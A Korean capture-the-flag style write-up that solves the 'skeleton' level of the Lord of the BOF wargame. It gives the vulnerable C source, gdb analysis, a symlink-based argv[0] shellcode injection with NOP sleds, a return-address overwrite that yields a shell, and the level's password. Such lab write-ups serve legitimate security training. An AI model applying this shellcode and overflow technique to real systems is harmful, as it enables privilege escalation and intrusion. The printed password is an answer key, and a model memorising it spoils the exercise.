# Summary

**이전 문제와 동일한 내용은 생략하고 추가된 내용만 다루었다.**

> 문제의 소스코드

```c
[vampire@localhost vampire]$ cat skeleton.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - skeleton
        - argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i, saved_argc;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	// argc saver
	saved_argc = argc;

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

	// ultra argv hunter!
	for(i=0; i<saved_argc; i++)
		memset(argv[i], 0, strlen(argv[i]));
}
```

<br>

소스코드를 살펴보니 이 문제에서 추가된 내용과 제약 조건은 다음과 같다.

- argc를 저장해 인자의 개수만큼 argv 모두 0으로 초기화
- 환경변수에 쉘코드 삽입 불가
- `buffer`에 쉘코드 삽입 불가
- 모든 인자 `argv`에 쉘코드 삽입 불가

<br>

# Analysis

어디에 쉘코드를 삽입할 수 있을지 gdb로 확인해보자.

```python
[vampire@localhost vampire]$ mkdir tmp; cp skeleton skeleton.c tmp
[vampire@localhost vampire]$ cd tmp
[vampire@localhost tmp]$ gdb -q skeleton
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x8048500 <main>:	push   %ebp
0x8048501 <main+1>:	mov    %ebp,%esp
0x8048503 <main+3>:	sub    %esp,48
0x8048506 <main+6>:	cmp    DWORD PTR [%ebp+8],1
0x804850a <main+10>:	jg     0x8048523 <main+35>
0x804850c <main+12>:	push   0x80486d0
0x8048511 <main+17>:	call   0x8048410 <printf>
0x8048516 <main+22>:	add    %esp,4
0x8048519 <main+25>:	push   0
0x804851b <main+27>:	call   0x8048420 <exit>
0x8048520 <main+32>:	add    %esp,4
0x8048523 <main+35>:	nop
0x8048524 <main+36>:	mov    DWORD PTR [%ebp-44],0x0
0x804852b <main+43>:	nop
0x804852c <main+44>:	lea    %esi,[%esi*1]
0x8048530 <main+48>:	mov    %eax,DWORD PTR [%ebp-44]
0x8048533 <main+51>:	lea    %edx,[%eax*4]
0x804853a <main+58>:	mov    %eax,%ds:0x8049804
0x804853f <main+63>:	cmp    DWORD PTR [%eax+%edx],0
0x8048543 <main+67>:	jne    0x8048547 <main+71>
0x8048545 <main+69>:	jmp    0x8048587 <main+135>
0x8048547 <main+71>:	mov    %eax,DWORD PTR [%ebp-44]
0x804854a <main+74>:	lea    %edx,[%eax*4]
0x8048551 <main+81>:	mov    %eax,%ds:0x8049804
0x8048556 <main+86>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048559 <main+89>:	push   %edx
0x804855a <main+90>:	call   0x80483f0 <strlen>
0x804855f <main+95>:	add    %esp,4
0x8048562 <main+98>:	mov    %eax,%eax
0x8048564 <main+100>:	push   %eax
0x8048565 <main+101>:	push   0
0x8048567 <main+103>:	mov    %eax,DWORD PTR [%ebp-44]
0x804856a <main+106>:	lea    %edx,[%eax*4]
0x8048571 <main+113>:	mov    %eax,%ds:0x8049804
0x8048576 <main+118>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048579 <main+121>:	push   %edx
0x804857a <main+122>:	call   0x8048430 <memset>
0x804857f <main+127>:	add    %esp,12
0x8048582 <main+130>:	inc    DWORD PTR [%ebp-44]
0x8048585 <main+133>:	jmp    0x8048530 <main+48>
0x8048587 <main+135>:	mov    %eax,DWORD PTR [%ebp+12]
0x804858a <main+138>:	add    %eax,4
0x804858d <main+141>:	mov    %edx,DWORD PTR [%eax]
0x804858f <main+143>:	add    %edx,47
0x8048592 <main+146>:	cmp    BYTE PTR [%edx],0xbf
0x8048595 <main+149>:	je     0x80485b0 <main+176>
0x8048597 <main+151>:	push   0x80486dc
0x804859c <main+156>:	call   0x8048410 <printf>
0x80485a1 <main+161>:	add    %esp,4
0x80485a4 <main+164>:	push   0
0x80485a6 <main+166>:	call   0x8048420 <exit>
0x80485ab <main+171>:	add    %esp,4
0x80485ae <main+174>:	mov    %esi,%esi
0x80485b0 <main+176>:	mov    %eax,DWORD PTR [%ebp+12]
0x80485b3 <main+179>:	add    %eax,4
0x80485b6 <main+182>:	mov    %edx,DWORD PTR [%eax]
0x80485b8 <main+184>:	push   %edx
0x80485b9 <main+185>:	call   0x80483f0 <strlen>
0x80485be <main+190>:	add    %esp,4
0x80485c1 <main+193>:	mov    %eax,%eax
0x80485c3 <main+195>:	cmp    %eax,48
0x80485c6 <main+198>:	jbe    0x80485e0 <main+224>
0x80485c8 <main+200>:	push   0x80486f9
0x80485cd <main+205>:	call   0x8048410 <printf>
0x80485d2 <main+210>:	add    %esp,4
0x80485d5 <main+213>:	push   0
0x80485d7 <main+215>:	call   0x8048420 <exit>
0x80485dc <main+220>:	add    %esp,4
0x80485df <main+223>:	nop
0x80485e0 <main+224>:	mov    %eax,DWORD PTR [%ebp+8]
0x80485e3 <main+227>:	mov    DWORD PTR [%ebp-48],%eax
0x80485e6 <main+230>:	mov    %eax,DWORD PTR [%ebp+12]
0x80485e9 <main+233>:	add    %eax,4
0x80485ec <main+236>:	mov    %edx,DWORD PTR [%eax]
0x80485ee <main+238>:	push   %edx
0x80485ef <main+239>:	lea    %eax,[%ebp-40]
0x80485f2 <main+242>:	push   %eax
0x80485f3 <main+243>:	call   0x8048440 <strcpy>
0x80485f8 <main+248>:	add    %esp,8
0x80485fb <main+251>:	lea    %eax,[%ebp-40]
0x80485fe <main+254>:	push   %eax
0x80485ff <main+255>:	push   0x8048710
0x8048604 <main+260>:	call   0x8048410 <printf>
0x8048609 <main+265>:	add    %esp,8
0x804860c <main+268>:	push   40
0x804860e <main+270>:	push   0
0x8048610 <main+272>:	lea    %eax,[%ebp-40]
0x8048613 <main+275>:	push   %eax
0x8048614 <main+276>:	call   0x8048430 <memset>
0x8048619 <main+281>:	add    %esp,12
0x804861c <main+284>:	mov    DWORD PTR [%ebp-44],0x0
0x8048623 <main+291>:	mov    %eax,DWORD PTR [%ebp-44]
0x8048626 <main+294>:	cmp    %eax,DWORD PTR [%ebp-48]
0x8048629 <main+297>:	jl     0x8048630 <main+304>
0x804862b <main+299>:	jmp    0x8048670 <main+368>
0x804862d <main+301>:	lea    %esi,[%esi]
0x8048630 <main+304>:	mov    %eax,DWORD PTR [%ebp-44]
0x8048633 <main+307>:	lea    %edx,[%eax*4]
0x804863a <main+314>:	mov    %eax,DWORD PTR [%ebp+12]
0x804863d <main+317>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048640 <main+320>:	push   %edx
0x8048641 <main+321>:	call   0x80483f0 <strlen>
0x8048646 <main+326>:	add    %esp,4
0x8048649 <main+329>:	mov    %eax,%eax
0x804864b <main+331>:	push   %eax
0x804864c <main+332>:	push   0
0x804864e <main+334>:	mov    %eax,DWORD PTR [%ebp-44]
0x8048651 <main+337>:	lea    %edx,[%eax*4]
0x8048658 <main+344>:	mov    %eax,DWORD PTR [%ebp+12]
0x804865b <main+347>:	mov    %edx,DWORD PTR [%eax+%edx]
0x804865e <main+350>:	push   %edx
0x804865f <main+351>:	call   0x8048430 <memset>
0x8048664 <main+356>:	add    %esp,12
0x8048667 <main+359>:	inc    DWORD PTR [%ebp-44]
0x804866a <main+362>:	jmp    0x8048623 <main+291>
0x804866c <main+364>:	lea    %esi,[%esi*1]
0x8048670 <main+368>:	leave
0x8048671 <main+369>:	ret
0x8048672 <main+370>:	nop
0x8048673 <main+371>:	nop
0x8048674 <main+372>:	nop
0x8048675 <main+373>:	nop
0x8048676 <main+374>:	nop
0x8048677 <main+375>:	nop
0x8048678 <main+376>:	nop
0x8048679 <main+377>:	nop
0x804867a <main+378>:	nop
0x804867b <main+379>:	nop
0x804867c <main+380>:	nop
0x804867d <main+381>:	nop
0x804867e <main+382>:	nop
0x804867f <main+383>:	nop
End of assembler dump.
```

<br>

`memset`함수를 이용해 변수 초기화가 이루어진 이후 적당한 지점에 브레이크 포인트를 걸어주고

초기화되지 않고 남아 있는 값을 확인한다.

```python
(gdb) b *main+368
Breakpoint 1 at 0x8048670
(gdb) r `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"`
Starting program: /home/vampire/tmp/skeleton `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����

Breakpoint 1, 0x8048670 in main ()
(gdb) x/100s 0xbfffffff-100
0xbfffffd0:	 ""
0xbfffffd1:	 ""
0xbfffffd2:	 ""
0xbfffffd3:	 ""
0xbfffffd4:	 ""
0xbfffffd5:	 ""
0xbfffffd6:	 ""
0xbfffffd7:	 ""
0xbfffffd8:	 ""
0xbfffffd9:	 ""
0xbfffffda:	 ""
0xbfffffdb:	 ""
0xbfffffdc:	 ""
0xbfffffdd:	 ""
0xbfffffde:	 ""
0xbfffffdf:	 ""
0xbfffffe0:	 ""
0xbfffffe1:	 "/home/vampire/tmp/skeleton"
0xbffffffc:	 ""
0xbffffffd:	 ""
0xbffffffe:	 ""
0xbfffffff:	 ""
0xc0000000:	 <Address 0xc0000000 out of bounds>
0xc0000000:	 <Address 0xc0000000 out of bounds>
```

<br>

맨끝 지점 `0xbfffffe1` 주소에 들어있는 값을 보니 `env(리눅스쉘명령)` 부분이 남아있는 것이 확인된다.

이 곳에 쉘 코드를 삽입해 문제를 풀면 될 것 같다.

여기서 부터는 orge 문제와 비슷하다.

쉘코드 또한 역시 `\x2f`가 제거된 쉘코드를 사용해야하므로 orge 문제에서 사용한 쉘코드를 사용했다.

```python
[vampire@localhost tmp]$ ln -s skeleton `python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"`
[vampire@localhost tmp]$ ls
skeleton
skeleton.c
????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????�?^1ɱ2?l?�??�?u��?�����2�Qi00tii0cjo?�QT?�?�?�?
```

<br>

`argv[0]`에 쉘코드를 삽입하기 위해 쉘코드가 들어간 심볼릭 링크 파일을 생성하고 다음과 같은 인자를 주어 실행한다.

```python
[vampire@localhost tmp]$ ./`python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"` `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault (core dumped)
```

<br>

다음과 같이 `core dump`를 확인해 어느 주소에 쉘코드가 들어갔는지 확인한다.

```python
[vampire@localhost tmp]$ gdb skeleton core
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux"...

warning: core file may not match specified executable file.
Core was generated by `                                                                              '.
Program terminated with signal 11, Segmentation fault.
Reading symbols from /lib/libc.so.6...done.
Reading symbols from /lib/ld-linux.so.2...done.
#0  0xbffff9e3 in ?? ()
(gdb) x/100s 0xbfffff00

(... 생략 ...)
0xbfffff2a:	 ""
0xbfffff2b:	 ""
0xbfffff2c:	 ""
0xbfffff2d:	 ""
0xbfffff2e:	 ""
0xbfffff2f:	 ""
0xbfffff30:	 ""
0xbfffff31:	 ""
0xbfffff32:	 ""
0xbfffff33:	 "./", '\220' <repeats 100 times>, "�\021^1ɱ2\200l\016�\001\200�\001u��\005���---Type <return> to continue, or q <return> to quit---
��2�Qi00tii0cjo\212�QT\212�\232�\f�\201", '\220' <repeats 50 times>
0xbffffffb:	 ""
0xbffffffc:	 ""
0xbffffffd:	 ""
0xbffffffe:	 ""
0xbfffffff:	 ""
0xc0000000:	 <Address 0xc0000000 out of bounds>
0xc0000000:	 <Address 0xc0000000 out of bounds>
0xc0000000:	 <Address 0xc0000000 out of bounds>
```

<br>

# Exploit

`0xbfffff33`에 쉘코드가 삽입된 것을 알 수 있다.

ret 값을 `0xbfffff33`주소로 변경하여 exploit 시도 결과 `shell`을 획득할 수 있었다.

**_여기서 주의할 점은 사용된 쉘코드의 특성상 쉘코드 뒤에 `shell+nop[50]`을 추가해줘야 한다._**

```python
[vampire@localhost vampire]$ ln -s skeleton `python -c "print '\x90'*100+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'+'\x90'*50"`
[vampire@localhost vampire]$ ./`python -c "print '\x90'*100+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'+'\x90'*50"` `python -c "print 'A'*44+'\x33\xff\xff\xbf'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3���
bash$ id
uid=509(vampire) gid=509(vampire) euid=510(skeleton) egid=510(skeleton) groups=509(vampire)
bash$ my-pass
euid = 510
shellcoder
```

### Clear! password is….

shellcoder



